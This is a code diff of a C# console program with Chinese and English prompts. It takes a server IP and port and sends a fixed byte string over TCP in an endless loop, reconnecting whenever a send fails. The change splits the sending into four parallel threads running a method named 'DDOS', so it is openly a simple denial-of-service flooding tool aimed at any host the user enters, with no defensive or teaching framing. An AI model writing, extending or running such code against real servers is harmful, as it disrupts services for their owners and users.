@@ -1,51 +1,63 @@
 using System;
 using System.Net;
 using System.Net.Sockets;
+using System.Threading;
 
 class Program {
-    public static void Main() {
-        string serverIP;
-        int serverPort;
-        int count = 0;
-        Console.Write("服务器    |  Server: ");//要求输入服务寄地址
-        serverIP = Console.ReadLine();
-        while (true) {//要求输入端口,并检测
+    public static string IP;
+    public static int Port;
+    public static int count = 0;
+    static void Main() {
+        Console.Write("服务器    |  Server: ");
+        Program.IP = Console.ReadLine();
+        while (true) {
             Console.Write("端口      |  Port  : ");
-            if (int.TryParse(Console.ReadLine(), out serverPort)) {
+            if (int.TryParse(Console.ReadLine(), out Program.Port)) {
                 break;
-            } else {//处理端口输入是否正确
+            } else {
                 Console.ForegroundColor = ConsoleColor.Red;
                 Console.WriteLine("端口不正确|  Invalid input");
                 Console.ResetColor();
             }
         }
+        Thread t1 = new Thread(DDOS);
+        Thread t2 = new Thread(DDOS);
+        Thread t3 = new Thread(DDOS);
+        Thread t4 = new Thread(DDOS);
+        t1.Start();
+        t2.Start();
+        t3.Start();
+        t4.Start();
+    }
+    static void DDOS() {
+        string serverIP = Program.IP;
+        int serverPort = Program.Port;
         reclient:
-        TcpClient client = new TcpClient();//定义tpc连接
+        TcpClient client = new TcpClient();
         try {
-            client.Connect(serverIP, serverPort);//连接服务器
+            client.Connect(serverIP, serverPort);
             Console.WriteLine("服务器连接成功  |  Connect success.");
-        } catch (Exception e) {//还是处理连接错误
+        } catch (Exception e) {
             Console.ForegroundColor = ConsoleColor.Red;
             Console.WriteLine("服务器连接失败  |  Unable to connect to server.");
             Console.ResetColor();
         }
-        NetworkStream stream = client.GetStream();//获取流
+        NetworkStream stream = client.GetStream();
         byte[] buffer = System.Text.Encoding.ASCII.GetBytes("DataDataDataDataDataData");
-        while (true) {//开始发包
-            count++;
+        while (true) {
+            Program.count++;
             try {
                 stream.Write(buffer, 0, buffer.Length);
-                Console.Write("发了第" + count + "次包");
+                Console.Write("发了第" + Program.count + "次包");
                 Console.ForegroundColor = ConsoleColor.Green;
                 Console.WriteLine("成功");
                 Console.ResetColor();
-            } catch (Exception e) {//处理错误
+            } catch (Exception e) {
                 Console.ForegroundColor = ConsoleColor.Red;
-                Console.WriteLine("在发送第" + count + "时发送问题" + e.Message);
+                Console.WriteLine("在发送第" + Program.count + "时发送问题" + e.Message);
                 Console.ResetColor();
                 goto reclient;
             }
         }
     }
 }
-//综上所述,祝你生活愉快,再见～
